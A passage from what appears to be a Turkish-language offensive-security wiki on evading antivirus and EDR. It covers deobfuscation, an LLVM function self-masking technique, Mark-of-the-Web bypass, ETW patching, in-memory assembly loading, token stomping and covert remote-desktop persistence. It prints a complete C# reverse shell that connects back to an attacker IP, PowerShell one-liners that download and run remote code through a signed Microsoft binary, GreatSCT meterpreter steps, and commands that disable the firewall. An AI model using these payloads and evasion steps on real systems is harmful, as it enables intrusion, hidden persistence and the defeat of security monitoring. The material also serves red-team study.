   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker'ınızı oluştururken işe yarayabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / control-flow kurtarma – *clean* dosyayı **de4dot-cex**'e (de4dot'un ConfuserEx uyumlu fork'u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bayraklar:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot control-flow flattening'i geri alır, özgün namespace'leri, sınıfları ve değişken adlarını geri yükler ve sabit dizeleri çözer.

3.  Proxy-call stripping – ConfuserEx, decompilation'ı daha da zorlaştırmak için doğrudan method çağrılarını hafif wrapper'larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra `Class8.smethod_10` gibi opak wrapper fonksiyonları yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.

4.  Manuel temizleme – Ortaya çıkan binary'yi dnSpy altında çalıştırın ve gerçek payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware genellikle bunu `<Module>.byte_0` içinde başlatılan, TLV ile kodlanmış bir byte dizisi olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya gerek kalmadan yürütme akışını geri yükler — çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak önceliklendirmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla yazılım güvenliğini artırabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı crack etmek isteyen kişinin işini biraz zorlaştıracak, C++ template metaprogramming framework tarafından üretilen obfuscated işlemlerden oluşan bir katman ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele executable dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM destekli diller için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly code düzeyinde obfuscate eder ve böylece normal control flow hakkındaki doğal algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM compiler-assisted, fonksiyon bazında self-masking

Bir implantın tamamını yalnızca uyku sırasında maskelemek yerine, değiştirilmiş bir LLVM X86 backend'i seçili fonksiyonları etkin olmadıkları sürece XOR-maskeli tutabilir. Function Peekaboo PoC'si, demangle edilmiş adlarında `REG_` bulunan fonksiyonları seçer, son machine code çevresine position-independent giriş/çıkış stub'ları ekler ve `.text` içinde ortak bir masking handler üretir; kaynak düzeyindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow dönüşümü

Bu dönüşüm, **üretilen her return talimatını** kapsaması ve x86 yerleşimini tam olarak bilmesi gerektiğinden, instruction selection ve optimizasyon aşamalarından sonra yapılmalıdır. Emission öncesi bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulup siler; böylece son yol eklenen epilogue'a düşer. Önceki return talimatlarını ise `JMP_1 handler` ile değiştirir. Her return öncesindeki compiler tarafından oluşturulmuş stack/frame teardown kodunu koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` fonksiyon başına stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue'daki bir branch'in daha sonra üretilecek epilogue'u hedeflemesini sağlar. Elle near `je` üretirken `0F 84` yazıp ardından dört baytlık MC ifadesi `target - address_after_je`'yi ekleyin. Handler'a yapılan çağrı ve atlamalar bunun yerine `MCInst` nesneleri (`CALL64pcrel32` ve `JMP_1`) olarak üretilebilir. Değişiklik yapmadığı seçilmemiş bir fonksiyon için pass `false` döndürmelidir; PoC bu durumda yanlışlıkla `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata ve pre-CRT başlatma

PoC, `.funcmeta` içine bir XOR key ve loader tarafından yeniden konumlandırılmış bir function pointer ile çalışma zamanı uzunluğunu içeren 16 baytlık kayıtlar yerleştirir. C alanı `uint32_t` olsa da handler, kayıt içindeki `+8` ofsetinde bir QWORD'a erişerek uzunluğu ve padding'ini okur ve kayıtlar arasında `0x10` ilerler. PE section adları yalnızca sekiz bayt kapladığından çalışma zamanı araması `.funcmet` adını görür. Harici bir patcher, executable `.stub` ekler, eski entry-point RVA'sını stub içinde saklar ve `AddressOfEntryPoint` değerini değiştirir. PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` üzerinden alır, PE32+ import'ları tarayarak önceden import edilmiş bir `VirtualProtect` fonksiyonunu çözümler ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Başlatma, `gs:[0xE8]` içine bir sentinel yazar ve metadata'daki her fonksiyonu çağırır. Kalıcı olarak okunabilir prologue, fonksiyon başlangıcını `gs:[0xF0]` içine kaydeder, sentinel'i algılar ve henüz maskelenmemiş body'yi atlar. Ardından epilogue `call handler` kullanır; handler 13 register'ı (`0x68` bayt) kaydettikten sonra `[rsp+0x68]` adresindeki return address, dönüştürülmüş fonksiyonun sonunu gösterir. Böylece `end - start` hesaplanıp metadata kaydına yazılabilir. Tüm body'ler maskelendikten sonra stub sentinel'i temizler ve `ImageBase + original_entry_point_RVA` adresine atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrıda prologue, body'nin şifresini çözmek için aynı simetrik handler'ı çağırır. Son yol eklenen epilogue'a düşerken önceki tüm return'ler doğrudan ortak handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır. Böylece yeniden maskeleme işleminden sonra handler'ın `ret` talimatı, çağıran fonksiyonun orijinal return address'ini kullanır ve fonksiyon sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive ve analiz göstergeleri

Handler mevcut kaydı bulur, sabit görünür prologue'u (bu build'de `0x46` bayt) atlar, kalan bölümü `PAGE_EXECUTE_READWRITE` olarak değiştirir, her baytı key'in düşük baytıyla XOR'lar ve ardından bölümü `PAGE_EXECUTE_READ` olarak ayarlar. Dolayısıyla aynı döngü, girişte şifreyi çözer ve her normal çıkışta yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarıma özgü, yüksek sinyalli göstergeler şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` içindeki bir entry point ve key ile yeniden konumlandırılmış `.text` pointer'larını tutan bir `.funcmet` bölümü;
- pre-CRT PEB, import table ve section table ayrıştırmasının ardından her metadata pointer'ı üzerinden yapılan çağrılar;
- aynı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilen çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` adreslerine yapılan yazmaların ardından tekrarlanan `VirtualProtect` geçişleri ve image-backed executable sayfalara yapılan bytewise XOR yazmaları.

Bu, memory scanner'lardan kaçınma tekniğidir; kriptografik koruma değildir: patch'lenmiş dosyada orijinal, şifresiz body hâlâ bulunur ve bir debugger `VirtualProtect` veya XOR döngüsünde duraklatılarak etkin fonksiyonu belleğe dökebilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da çevrimdışı kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slot'ları thread-local olsa da değiştirilmiş code sayfaları process-wide'dir. Bu nedenle eşzamanlı veya recursive giriş, başka bir çağrı yürütülürken talimatların tekrar toggle edilmesine yol açabilir; exception'lar ve nonlocal exit'ler de yeniden maskeleme işlemini atlayabilir. Sağlam bir uygulama geçişleri senkronize etmeli, `lpflOldProtect` aracılığıyla döndürülen gerçek protection değerini geri yüklemeli, hard-coded stub uzunluklarından kaçınmalı, x64 stack alignment açısından hem `call` hem de `jmp` yollarını denetlemeli ve executable baytları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, executable code değiştirildiğinde instruction-cache tutarlılığını sağlama sorumluluğunu açıkça çağırana yükler.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı executable dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak zararlı uygulamaları çalıştırmaya karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen çoğunlukla itibara dayalı bir yaklaşım kullanır. Bu nedenle nadiren indirilen uygulamalar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (ancak More Info -> Run anyway seçeneğine tıklayarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir. İnternetten indirilen dosyalar için otomatik olarak oluşturulur ve dosyanın indirildiği URL'yi içerir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir imzalama sertifikasıyla imzalanmış executable dosyaların **SmartScreen'i tetiklemeyeceğini** unutmamak önemlidir.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Örnek kullanım:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen'i atlatmaya yönelik bir demo

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Windows için Olay İzleme (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları loglamasına** olanak tanıyan güçlü bir loglama mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (atlatılmasına) benzer şekilde, kullanıcı alanındaki sürecin **`EtwEventWrite`** işlevinin herhangi bir olayı loglamadan hemen geri dönmesini sağlamak da mümkündür. Bunun için işlev bellekte yamalanarak hemen geri dönmesi sağlanır; böylece söz konusu süreç için ETW loglaması etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgiyi **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinde bulabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yükleme yöntemi uzun zamandır biliniyor ve post-exploitation araçlarınızı AV'ye yakalanmadan çalıştırmanın hâlâ çok iyi bir yolu.

Payload doğrudan belleğe yükleneceği ve diske dokunmayacağı için yalnızca tüm süreç boyunca AMSI'yi yamalamamız gerekecek.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma olanağı sunuyor; ancak bunu yapmanın farklı yolları var:

- **Fork\&Run**

Bu yöntem, **yeni bir feda edilebilir süreç başlatmayı**, post-exploitation amaçlı kötü amaçlı kodunuzu bu yeni sürece enjekte etmeyi, kodunuzu çalıştırmayı ve işiniz bittiğinde yeni süreci sonlandırmayı içerir. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation işleminizde bir şeyler ters giderse veya yakalanırsa **implantın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Davranışsal Tespitler** tarafından yakalanma **olasılığınızın daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation amaçlı kötü amaçlı kodu **kendi sürecine** enjekte etmekle ilgilidir. Böylece yeni bir süreç oluşturup AV tarafından taranmasından kaçınabilirsiniz; ancak payload'ınız çalışırken bir şeyler ters giderse çökebileceği için **beacon'ınızı kaybetme olasılığınız çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek isterseniz şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'a ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell'den** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'ın videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği üzere, ele geçirilmiş makineye **Saldırganın Kontrolündeki SMB paylaşımında kurulu yorumlayıcı ortamına** erişim vererek diğer dillerle kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki yorumlayıcı binary'lerine ve ortama erişim izni vererek, ele geçirilmiş makinenin belleğinde bu dillerle **keyfi kod çalıştırabilirsiniz**.

Depoda belirtildiğine göre: Defender betikleri taramaya devam ediyor; ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esnekliğe** sahip oluyoruz. Bu dillerde rastgele, gizlenmemiş reverse shell betikleriyle yapılan testler başarılı oldu.

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün erişim token'ını değiştirir. Token'ın ayrıcalıklarını düşürmek, sürecin çalışmaya devam etmesini sağlarken ayrıcalık gerektiren inceleme veya düzeltme işlemlerini yapmasını engelleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılımları Kullanma

### Chrome Remote Desktop

[**Bu blog gönderisinde**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, kurbanın bilgisayarına Chrome Remote Desktop'ı dağıtıp ardından bilgisayarın kontrolünü ele geçirmek ve kalıcılığı sürdürmek kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın ve MSI dosyasını indirmek için Windows MSI dosyasına tıklayın.
2. Kurulum programını kurbanda sessizce çalıştırın (yönetici yetkisi gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp next düğmesine tıklayın. Sihirbaz sizden yetkilendirme isteyecek; devam etmek için Authorize düğmesine tıklayın.
4. Gerekli düzenlemeleri yaparak sağlanan komutu çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI kullanmadan PIN belirler).
 

## Gelişmiş Evasion

Evasion oldukça karmaşık bir konudur; bazen tek bir sistemdeki birçok farklı telemetri kaynağını hesaba katmanız gerekir. Bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi önemle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılmış bir başka harika konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi kısımları kötü amaçlı bulduğunu kontrol etme**

**Binary'nin hangi kısmının Defender tarafından kötü amaçlı bulunduğunu** tespit edene kadar **binary'nin parçalarını kaldırıp** size bu parçayı gösteren [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz.\
Aynı işi yapan bir diğer araç [**avred**](https://github.com/dobin/avred); bu hizmeti sunan açık bir web sitesi de [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Windows10'a kadar tüm Windows sürümleri, yönetici olarak yükleyebileceğiniz bir **Telnet server** ile geliyordu. Şöyle yapabilirsiniz:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet portunu değiştirin** (stealth) **ve güvenlik duvarını devre dışı bırakın:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin indirmelerini istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından, _**winvnc.exe**_ binary dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **kurbanın** içine taşıyın

#### **Ters bağlantı**

**Saldırgan**, ters bir **VNC bağlantısını** yakalamaya **hazır** olmak için `vncviewer.exe -listen 5900` binary dosyasını **kendi hostunda** çalıştırmalıdır. Ardından, **kurbanın** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın, yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın, yoksa [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın, yoksa bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT'nin İçinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi **lister'ı** `msfconsole -r file.rc` ile **başlatın** ve **xml payload'ını** şu komutla **yürütün**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Mevcut defender süreci çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Şununla kullan:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# derleyicisini kullanarak

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanımına örnek:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space’ten AV/EDR’yi Öldürme

Storm-2603, ransomware’ı bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç, **kendi savunmasız ama *imzalı* sürücüsünü** getirir ve Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bu sürücüyü kötüye kullanır.<sup>[[12]](#references)</sup>

Önemli noktalar
1. **İmzalı sürücü**: Diske yazılan dosya `ServiceMouse.sys` olsa da ikili dosya, Antiy Labs’in “System In-Depth Analysis Toolkit” paketindeki meşru biçimde imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığından Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Hizmet kurulumu**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
